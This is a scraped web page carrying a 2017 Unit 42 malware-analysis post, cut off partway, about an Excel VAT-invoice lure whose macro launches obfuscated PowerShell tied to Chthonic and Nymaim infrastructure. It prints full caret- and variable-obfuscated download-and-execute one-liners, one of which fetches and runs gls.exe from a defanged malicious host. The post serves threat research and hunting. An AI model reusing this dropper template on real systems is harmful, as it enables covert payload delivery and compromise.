function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-39862 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">The Curious Case of Notepad and Chthonic: Exposing a Malicious Infrastructure</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-39862 entry-meta">
			
			
			<span class="post-views-count">22,010</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'39862','like')"><i class="ui ui-2"></i><span class="ml-5">0</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 10</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure%2F+-+The+Curious+Case+of+Notepad+and+Chthonic%3A+Exposing+a+Malicious+Infrastructure" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure%2F&title=The+Curious+Case+of+Notepad+and+Chthonic%3A+Exposing+a+Malicious+Infrastructure&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/jeff-white/" title="Posts by Jeff White" class="author url fn" rel="author">Jeff White</a>        </p>
        <p><time datetime="2017-08-15T12:00:23+00:00">August 15, 2017 at 5:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/chthonic/" rel="tag">Chthonic</a>, <a href="https://unit42.paloaltonetworks.com/tag/microsoft/" rel="tag">microsoft</a>, <a href="https://unit42.paloaltonetworks.com/tag/nymaim/" rel="tag">Nymaim</a>, <a href="https://unit42.paloaltonetworks.com/tag/powershell/" rel="tag">Powershell</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
                    <p>Recently, I’ve been investigating malware utilizing PowerShell and have spent a considerable amount of time refining ways to identify new variants of attacks as they appear. This posting is a follow-up of my previous work on this subject in  <a href="http://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/">&#8220;Pulling Back the Curtains on EncodedCommand PowerShell Attacks&#8221;</a>.</p>
<p>In a sample I recently analyzed, something stood out as extremely suspicious which led me down a rabbit hole, uncovering malicious infrastructure supporting Chthonic, Nymaim, and other malware and malicious websites.</p>
<p>Throughout this blog post I present my analysis and thought process during this research, but if you would just like a list of the findings, they are over on our <a href="https://github.com/pan-unit42/iocs/tree/master/notepadcase">Unit42 GitHub</a>.</p>
<h3>One of these things is not like the others…</h3>
<p>Most commonly, PowerShell is launched from a Microsoft Office document that uses a VBA macro to launch PowerShell to perform something malicious – typically downloading the “real” malware to run. I focused my hunting on the PowerShell activity with Palo Alto Networks AutoFocus to determine whether it’s worth digging into further based on “uniqueness” and functionality.</p>
<p>In this case, the first sample I looked at stood out for another reason entirely. If you take a look at the below PowerShell, you’ll quickly understand why.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694cac477ef750102388" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;null&gt; , cMd.exe /c "p^Ow^ERS^hel^l^.e^x^e^ -nO^l -No^Ni^Nt^ -W^InDO^ws^ 1 -NoprO^FIle^ -eX^Ec^U B^Ypa^S^s $fos=''',''';$hit='dfil';$fd=');sta';$dr='(ne';$ed='ject ';$ipo='syst';$kos='t.we';$rem='ent).do';$sad='wnloa';$kp='w-ob';$nim='e(''';$mo='%ap';$uy='pdat';$ji='a%.ex';$pol='em.ne';$oe='e''';$jik='rt-pro';$naw='cess ''';$lim='bcli';Invoke-Expression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'https://notepad-plus-plus[.]org/repository/7.x/7.4.2/npp.7.4.2.Installer.exe'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cac477ef750102388-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cac477ef750102388-1"><span class="crayon-o">&lt;</span><span class="crayon-t">null</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">cMd</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-s">"p^Ow^ERS^hel^l^.e^x^e^ -nO^l -No^Ni^Nt^ -W^InDO^ws^ 1 -NoprO^FIle^ -eX^Ec^U B^Ypa^S^s $fos=''',''';$hit='dfil';$fd=');sta';$dr='(ne';$ed='ject ';$ipo='syst';$kos='t.we';$rem='ent).do';$sad='wnloa';$kp='w-ob';$nim='e(''';$mo='%ap';$uy='pdat';$ji='a%.ex';$pol='em.ne';$oe='e''';$jik='rt-pro';$naw='cess ''';$lim='bcli';Invoke-Expression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'https://notepad-plus-plus[.]org/repository/7.x/7.4.2/npp.7.4.2.Installer.exe'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>This code downloads a file from the legitimate Notepad++ website. My initial thought was the worst-case scenario – they’ve been compromised and are distributing malware! I immediately downloaded the file from the website, but everything looked normal. Of course, I had to investigate further.</p>
<p>The sample stayed true to the previous outline I laid out for these attacks: the Microsoft Excel document appeared to be a lure about financial information, specifically a VAT invoice written in Polish as shown below.</p>
<p><img class="alignnone size-full wp-image-40297" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_001.png" alt="cht_001" width="826" height="720" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_001.png 826w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_001-300x262.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_001-768x669.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_001-370x323.png 370w" sizes="(max-width: 826px) 100vw, 826px" /></p>
<p>Looking under the hood we see the VBA code that builds the PowerShell command and launches it but something seemed off. There are a ton of functions that are clearly decoding information from arrays after which it executes an already decoded PowerShell command. I decided to debug the macro and see exactly what it’s doing before I made any decisions.</p>
<p><img class="alignnone size-full wp-image-40378" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/Chthonic2.png" alt="Chthonic2" width="899" height="265" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/Chthonic2.png 899w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/Chthonic2-300x88.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/Chthonic2-768x226.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/Chthonic2-370x109.png 370w" sizes="(max-width: 899px) 100vw, 899px" /></p>
<p>If you look at the above image, there are five things to note.</p>
<p>1. The variable ‘horrorr’ (double ‘r’) is the result of all of the previously mentioned decoding functions. This builds a PowerShell command.</p>
<p>2.You can see ‘Shelleeeee horrorr, 0’ commented out, I believe this was intended to launch the previous PowerShell command.</p>
<p>3. The ‘Debug.Print horrorr’ prints the content of that variable in the ‘Immediate’ area shown in the screenshot. The domain in this command is NOT ‘notepad-plus-plus.org’ and can be seen below.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694cac477fb899741761" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
cMd.exe   /c "p^Ow^ERS^hel^l^.e^x^e^  -nO^l -No^Ni^Nt^  -W^InDO^ws^ 1 -NoprO^FIle^  -eX^Ec^U  B^Ypa^S^s $fos=''',''';$hit='dfil';$fd=');sta';$dr='(ne';$ed='ject ';$ipo='syst';$kos='t.we';$rem='ent).do';$sad='wnloa';$kp='w-ob';$nim='e(''';$mo='%ap';$uy='pdat';$ji='a%.ex';$pol='em.ne';$oe='e''';$jik='rt-pro';$naw='cess ''';$lim='bcli';Invoke-Expression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'https://farhenzel[.]co/gls.exe'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cac477fb899741761-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cac477fb899741761-1"><span class="crayon-v">cMd</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">/</span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-s">"p^Ow^ERS^hel^l^.e^x^e^&nbsp;&nbsp;-nO^l -No^Ni^Nt^&nbsp;&nbsp;-W^InDO^ws^ 1 -NoprO^FIle^&nbsp;&nbsp;-eX^Ec^U&nbsp;&nbsp;B^Ypa^S^s $fos=''',''';$hit='dfil';$fd=');sta';$dr='(ne';$ed='ject ';$ipo='syst';$kos='t.we';$rem='ent).do';$sad='wnloa';$kp='w-ob';$nim='e(''';$mo='%ap';$uy='pdat';$ji='a%.ex';$pol='em.ne';$oe='e''';$jik='rt-pro';$naw='cess ''';$lim='bcli';Invoke-Expression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'https://farhenzel[.]co/gls.exe'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>4. The ‘MsgBox’ will pop-up and not display anything, because the variable passed is ‘horror’ (1 ‘r’) along with the message ‘Do you really think I&#8217;m not a virus?’ in Polish.</p>
<p>5. The hard coded PowerShell command with ‘notepad-plus-plus.org’ will run.</p>
<p>The most likely conclusion that can be drawn here is that an analyst or researcher obtained this file, modified it to see the content (misspelling the variable name along the way) post-decoding, and uploaded it to see what it did in a sandbox. To be sure though, I needed to find other samples and see how they stacked up against this one.</p>
<p>Going back to the PowerShell command, the initial reason I stopped to look at it was due to the way they concatenated variables to form the download command and output. This also provides a perfect pivot point to hunt for samples. Using the below string to search Process Activity in AutoFocus revealed 171 samples.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694cac477fe063970026" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cac477fe063970026-1">1</div></div>
				</td>
